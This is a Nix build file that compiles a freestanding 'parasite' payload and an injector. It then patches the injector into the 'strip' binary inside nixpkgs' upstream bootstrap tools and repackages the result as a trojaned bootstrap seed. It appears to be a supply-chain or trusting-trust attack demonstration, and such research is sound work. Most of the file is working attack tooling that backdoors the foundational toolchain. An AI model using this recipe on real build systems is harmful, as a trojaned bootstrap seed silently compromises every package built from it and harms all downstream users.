{ pkgs, nixpkgsSrc }:

let
  src = pkgs.lib.cleanSourceWith {
    src = ./.;
    filter = path: type:
      let base = baseNameOf path; in
      !(builtins.elem base [
        "injector" "test_hello" "fake_strip"
        "parasite.bin" "parasite.elf" "parasite.o"
        "parasite_blob.h" "result"
      ]);
  };

  upstreamSeed = (import "${nixpkgsSrc}/pkgs/stdenv/linux/make-bootstrap-tools.nix" {
    inherit pkgs;
  }).bootstrapFiles;

  injector = pkgs.stdenv.mkDerivation {
    pname   = "attack-injector";
    version = "0.3";
    src     = src;

    nativeBuildInputs = with pkgs; [ gcc binutils ];

    buildPhase = ''
      runHook preBuild

      gcc -O2 -fPIE -fno-plt -ffreestanding -nostdlib -nostartfiles \
          -fno-stack-protector -fno-asynchronous-unwind-tables \
          -fcf-protection=none -Wall -Wextra -std=c11 \
          -c parasite.c -o parasite.o
      ld -nostdlib -static --no-dynamic-linker --build-id=none \
         -T parasite.lds -o parasite.elf parasite.o
      objcopy -O binary parasite.elf parasite.bin
      bash gen_blob_header.sh parasite.bin parasite.elf > parasite_blob.h

      gcc -O2 -Wall -Wextra -std=c11 -o attack-injector injector.c

      runHook postBuild
    '';

    installPhase = ''
      runHook preInstall
      mkdir -p $out/bin
      install -m 755 attack-injector $out/bin/attack-injector
      runHook postInstall
    '';

    dontStrip    = true;
    dontPatchELF = true;
    dontFixup    = true;
  };

  trojanBootstrapTools = pkgs.runCommand "attack-trojan-bootstrap-tools.tar.xz" {
    nativeBuildInputs = with pkgs; [ xz gnutar ] ++ [ injector ];
    inherit (upstreamSeed) bootstrapTools;
  } ''
    mkdir extracted
    cd extracted
    tar xJf $bootstrapTools

    if [ -e bin/strip ] && [ ! -L bin/strip ]; then
      attack-injector --v2 bin/strip
    elif [ -e usr/bin/strip ]; then
      attack-injector --v2 usr/bin/strip
    else
      echo "attack: cannot locate strip in upstream seed"
      ls -la bin/ usr/bin/ 2>/dev/null || true
      exit 1
    fi

    cd ..
    tar -cf - -C extracted . | xz -9 -e --threads=0 > "$out"
  '';

  trojanSeed = {
    bootstrapTools = trojanBootstrapTools;
    inherit (upstreamSeed) busybox;
  };
in
{
  inherit upstreamSeed trojanSeed;
  tools = injector;
}